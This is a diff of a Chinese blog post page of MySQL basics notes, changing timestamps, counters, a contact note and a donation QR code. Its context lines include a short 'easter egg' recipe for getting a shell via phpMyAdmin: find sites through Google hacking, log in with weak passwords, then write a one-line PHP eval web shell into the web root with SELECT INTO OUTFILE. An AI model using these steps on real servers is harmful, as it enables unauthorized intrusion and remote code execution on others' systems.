@@ -148,7 +148,7 @@
 <meta property="og:image" content="https://clancyb00m.github.io/img/mysql/desc01.png">
 <meta property="og:image" content="https://clancyb00m.github.io/img/mysql/where01.png">
 <meta property="og:image" content="https://clancyb00m.github.io/img/mysql/caidan01.jpg">
-<meta property="og:updated_time" content="2018-12-30T10:42:42.917Z">
+<meta property="og:updated_time" content="2018-12-30T13:52:21.677Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MySQL数据库基础知识笔记">
 <meta name="twitter:description" content="数据库数据库即存储数据的仓库，是一个管理数据的软件 数据库模型 关系型数据库（也称结构化数据库） MySQL：轻量级开源数据库，适用于中小型企业，性能较好 MSSQL(SQL server)：微软开发的，适用于中大型企业，需要微软系统作为支撑，不支持跨平台 Oracle：收费，适用于大型企业的需求，支持跨平台，需要良好的硬件配置作为支撑 DB2 ……   非关系型数据库（也称非结构化数据库） re">
@@ -445,7 +445,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2018-12-30 18:42:42" itemprop="dateModified" datetime="2018-12-30T18:42:42+08:00">2018-12-30</time>
+                <time title="修改时间：2018-12-30 21:52:21" itemprop="dateModified" datetime="2018-12-30T21:52:21+08:00">2018-12-30</time>
               
             
           </span>
@@ -668,6 +668,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p db_name &gt; ./db_name.sql	在DOS命令下运行</span><br><span class="line"></span><br><span class="line">mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名</span><br><span class="line"></span><br><span class="line">mysqldump -u 用户名 -p 数据库名 表名 &gt; 导出的文件名</span><br></pre></td></tr></table></figure>
 <h1 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h1><p><img src="/img/mysql/caidan01.jpg" alt="img"></p>
 <h2 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 首先通过google hacking找到phpmyadmin的网站</span><br><span class="line"></span><br><span class="line">2. 弱口令登录，SHOW GLOBAL VARIABLES LIKE &apos;%secure_file_priv%&apos;;判断我们有没有权限去写木马文件</span><br><span class="line"></span><br><span class="line">3. 执行SQL语句，查看数据库所在位置：select @@basedir;</span><br><span class="line"></span><br><span class="line">4. 猜测根目录写入木马文件：`select  &apos;&lt;?php eval($_POST[_]);?&gt;&apos; into outfile &apos;G;//shell.php&apos;`：注意：写木马的路径，一般是`/var/www/html`</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果本文有任何错误，欢迎留言给我：<a href="https://github.com/clancyb00m/clancyb00m.github.io/issues" target="_blank" rel="noopener">Contact Me！</a></p>
+</blockquote>
+
       
     </div>
 
@@ -694,12 +698,12 @@
     
 
     
-      <div id="alipay" style="display: inline-block">
-        <img id="alipay_qr" src="/images/alipay.jpg" alt="clancy 支付宝">
-        <p>支付宝</p>
-      </div>
-    
 
+    
+      <div id="bitcoin" style="display: inline-block">
+        <img id="bitcoin_qr" src="/images/haha.gif" alt="clancy 比特币">
+        <p>比特币</p>
+      </div>
     
 
   </div>
@@ -814,7 +818,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-count">19</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -865,7 +869,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">18</span>
+                      
+                    
+                    <span class="site-state-item-count">19</span>
                     <span class="site-state-item-name">标签</span>
                   
                 </div>
@@ -965,7 +971,7 @@
 -->
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共17.6k字</span>
+  <span class="post-count">博客全站共19.3k字</span>
 </div>
         
 
